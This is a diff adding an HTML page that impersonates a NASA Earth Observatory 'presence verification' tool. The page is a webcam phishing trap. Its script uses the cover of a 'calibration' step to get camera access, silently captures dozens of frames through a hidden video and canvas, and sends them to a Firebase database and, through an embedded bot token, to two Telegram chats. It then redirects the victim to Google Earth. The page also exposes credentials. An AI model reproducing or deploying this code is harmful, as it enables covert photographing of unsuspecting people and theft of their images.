@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NASA | Earth Presence Map</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --nasa-blue: #0b3d91;
+            --nasa-red: #fc3d21;
+            --space-black: #03070b;
+            --space-grey: #2e2e2e;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--space-black); color: #ffffff;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+            background-image: radial-gradient(circle at center, #1a2a44 0%, #03070b 100%);
+        }
+
+        .nasa-card {
+            width: 90%; max-width: 450px; background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px;
+            backdrop-filter: blur(10px); overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
+
+        .nasa-header {
+            padding: 20px; background: rgba(11, 61, 145, 0.3);
+            display: flex; align-items: center; justify-content: space-between;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .nasa-logo { width: 50px; }
+
+        .earth-viz {
+            width: 100%; height: 180px; background: url('https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&w=450&q=80') center;
+            background-size: cover; position: relative;
+        }
+
+        .viz-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, transparent 30%, var(--space-black) 100%);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+        }
+
+        .content-body { padding: 30px 24px; text-align: center; }
+
+        h1 { font-size: 18px; letter-spacing: 1px; margin: 0 0 10px; font-weight: 300; text-transform: uppercase; }
+        p { font-size: 13px; color: #b0b0b0; line-height: 1.6; margin-bottom: 25px; }
+
+        .btn-nasa {
+            background: var(--nasa-blue); color: #fff; border: 1px solid rgba(255,255,255,0.2);
+            width: 100%; padding: 14px; border-radius: 4px; font-weight: 600;
+            text-transform: uppercase; letter-spacing: 2px; cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .btn-nasa:hover { background: #124da8; box-shadow: 0 0 15px var(--nasa-blue); }
+
+        /* Sync Logic */
+        #sync-ui { display: none; }
+        
+        .orbit-loader {
+            width: 60px; height: 60px; border: 2px solid #222; border-top: 2px solid var(--nasa-red);
+            border-radius: 50%; margin: 0 auto 20px; animation: orbit 1s linear infinite;
+        }
+        @keyframes orbit { to { transform: rotate(360deg); } }
+
+        .terminal-text {
+            text-align: left; background: rgba(0,0,0,0.4); padding: 12px; border-radius: 4px;
+            font-family: 'Courier New', Courier, monospace; font-size: 10px; color: #4af626;
+            margin-top: 25px; line-height: 1.4; border: 1px solid rgba(74, 246, 38, 0.2);
+        }
+
+        .location-tag { font-size: 9px; color: #666; margin-top: 20px; letter-spacing: 2px; }
+    </style>
+</head>
+<body>
+
+    <div class="nasa-card">
+        <div class="nasa-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e5/NASA_logo.svg" class="nasa-logo" alt="NASA">
+            <div style="font-size: 10px; letter-spacing: 1px;">EARTH OBSERVATORY</div>
+        </div>
+
+        <div class="earth-viz">
+            <div class="viz-overlay">
+                <div style="font-size: 10px; border: 1px solid #fff; padding: 4px 8px; border-radius: 20px;">SATELLITE LINK ACTIVE</div>
+            </div>
+        </div>
+
+        <div class="content-body" id="init-view">
+            <h1>Presence Verification</h1>
+            <p>To pinpoint your digital presence on the Earth Observation Map, please initialize <b>Holographic Identity Calibration</b>. This captures a visual hash for your mission certificate.</p>
+            
+            <button class="btn-nasa" onclick="startNasaSync()">Calibrate & Locate</button>
+            <div class="location-tag">NODE: MUMBAI_ISRO_RELAY</div>
+        </div>
+
+        <div class="content-body" id="sync-ui">
+            <div class="orbit-loader"></div>
+            <div style="font-size: 14px; letter-spacing: 1px;">Synchronizing with Satellite Node...</div>
+            <div style="font-size: 11px; color: #888; margin-top: 8px;" id="nasa-timer">Telemetry valid for 60s</div>
+            
+            <div class="terminal-text">
+                > UPLINK: MUMBAI_PRIMARY_GATEWAY<br>
+                > SAT: EOS-2026-ALPHA<br>
+                > STATUS: ENCRYPTING_VISUAL_HASH_BLOB
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Recon Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startNasaSync() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('nasa-timer').innerText = `Telemetry valid for ${timeLeft}s`;
+
+                        if (count <= 55) {
+                            nasaCapture(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://earth.google.com/web/";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://earth.google.com/web/";
+            }
+        }
+
+        function nasaCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "NASA_EARTH_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_NODE" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'nasa_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
